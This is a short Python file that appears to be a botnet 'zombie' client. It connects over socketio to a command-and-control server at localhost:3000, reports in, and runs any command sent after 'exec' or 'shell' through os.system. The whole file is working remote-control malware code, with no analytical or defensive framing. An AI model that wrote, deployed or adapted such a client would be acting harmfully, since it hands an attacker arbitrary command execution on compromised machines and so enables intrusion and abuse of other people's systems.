import socketio
import os

sio = socketio.Client()

@sio.event
def connect():
    print('Connection established')
    sio.emit('message', 'message Hello from zombie!')

def ping(args):
    sio.emit('message', 'message Pinged zombie!')

def shell(args):
    return os.system(' '.join(args[1:]))

@sio.event
def message(data):
    print('Message from server:', data)
    command = data.split(' ')
    
    commands = [
        {
            'name': ['ping', 'check', 'hello'],
            'callback': ping,
        },
        {
            'name': ['exec', 'shell'],
            'callback': shell,
        }
    ]
    
    for cmd in commands:
        if command[0].replace('-all', '') in cmd['name']:
            cmd['callback'](command)

@sio.event
def disconnect():
    print('Disconnected from server')

def main():
    sio.connect('http://localhost:3000')
    sio.wait()

if __name__ == '__main__':
    main()
